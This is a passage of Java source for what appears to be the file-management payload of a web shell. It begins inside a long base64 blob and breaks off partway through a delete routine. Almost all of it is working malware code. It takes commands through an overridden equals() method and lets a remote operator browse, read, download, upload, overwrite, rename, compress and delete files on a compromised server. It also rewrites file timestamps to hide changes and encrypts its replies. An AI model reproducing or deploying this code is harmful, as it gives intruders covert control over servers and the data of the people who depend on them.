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";
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap();
        try {
            try {
                fillContext(obj);
                if (mode.equalsIgnoreCase("list")) {
                    result.put("msg", list());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("show")) {
                    result.put("msg", show());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("checkExist")) {
                    result.put("msg", checkExist(path));
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("delete")) {
                    result = delete();
                } else if (mode.equalsIgnoreCase("create")) {
                    result.put("msg", create());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("append")) {
                    result.put("msg", append());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("update")) {
                    updateFile();
                    result.put("msg", "ok");
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("downloadPart")) {
                    result.put("msg", downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
                    result.put("status", "success");
                } else {
                    if (mode.equalsIgnoreCase("download")) {
                        download();
                        try {
                            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                            Method write = so.getClass().getMethod("write", byte[].class);
                            write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return true;
                    }
                    if (mode.equalsIgnoreCase("rename")) {
                        result = renameFile();
                    } else if (mode.equalsIgnoreCase("createFile")) {
                        result.put("msg", createFile());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("compress")) {
                        zipFile(path, true);
                        result.put("msg", "ok");
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("createDirectory")) {
                        result.put("msg", createDirectory());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                        result.put("msg", getTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                        result.put("msg", updateTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("check")) {
                        result.put("msg", checkFileHash(path));
                        result.put("status", "success");
                    }
                }
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class);
                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                    return true;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return true;
                }
            } catch (Throwable e3) {
                e3.printStackTrace();
                result.put("msg", e3.getMessage());
                result.put("status", "fail");
                try {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write3 = so3.getClass().getMethod("write", byte[].class);
                    write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    return true;
                } catch (Exception e4) {
                    e4.printStackTrace();
                    return true;
                }
            }
        } catch (Throwable th) {
            try {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write4 = so4.getClass().getMethod("write", byte[].class);
                write4.invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
            } catch (Exception e5) {
                e5.printStackTrace();
            }
            throw th;
        }
    }

    private String checkFileHash(String path2) throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch != null && ch.isOpen()) {
            ch.close();
        }
        byte[] input = getFileData(path2);
        if (input == null || input.length == 0) {
            return null;
        }
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input);
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            sb.append(String.format("%02x", Byte.valueOf(b)));
        }
        return sb.substring(0, 16);
    }

    private void updateFile() throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileOutputStream fos = new FileOutputStream(path);
            ch = fos.getChannel();
            sessionSetAttribute(this.Session, "fos", fos);
            sessionSetAttribute(this.Session, path, ch);
        }
        synchronized (ch) {
            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
            ch.write(ByteBuffer.wrap(base64decode(content)));
        }
    }

    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        String version = System.getProperty("java.version");
        if (version.compareTo("1.7") >= 0) {
            return false;
        }
        return true;
    }

    private String checkExist(String path2) throws Exception {
        File file = new File(path2);
        if (file.exists()) {
            return file.length() + "";
        }
        throw new Exception("");
    }

    private String getFilePerm(File file) {
        String permStr = "";
        if (isWindows()) {
            try {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            } catch (Error e) {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/-";
            }
        } else {
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0) {
                try {
                    getClass();
                    Class<?> cls = Class.forName("java.nio.file.Files");
                    getClass();
                    Class<?> cls2 = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                    getClass();
                    Class<?> cls3 = Class.forName("java.nio.file.Paths");
                    getClass();
                    Class<?> cls4 = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                    Object f = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), file.getAbsolutePath(), new String[0]);
                    Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, f, cls2, new LinkOption[0]);
                    Object result = cls4.getMethod("toString", Set.class).invoke(cls4, cls2.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
                    permStr = result.toString();
                } catch (Exception e2) {
                }
            } else {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            }
        }
        return permStr;
    }

    private String list() throws Exception {
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
        objArr.add(warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(warpFileObj(temp));
            }
        }
        String result = buildJsonArray(objArr, true);
        return result;
    }

    private String show() throws Exception {
        byte[] fileContent = getFileData(path);
        return base64encode(fileContent);
    }

    private byte[] getFileData(String path2) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(new File(path2));
        while (true) {
            int data = fis.read();
            if (data != -1) {
                output.write(data);
            } else {
                fis.close();
                return output.toByteArray();
            }
        }
    }

    private String create() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "上传完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> renameFile() throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        String result = path + "创建完成";
        return result;
    }

    private String createDirectory() throws Exception {
        File dir = new File(path);
        dir.mkdirs();
        String result = path + "创建完成";
        return result;
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while (true) {
            int data = fis.read();
            if (data != -1) {
                write.invoke(so, Integer.valueOf(data));
            } else {
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                fis.close();
                return;
            }
        }
    }

    private String append() throws Exception {
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "追加完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> delete() throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
                result.put("status", "fail");
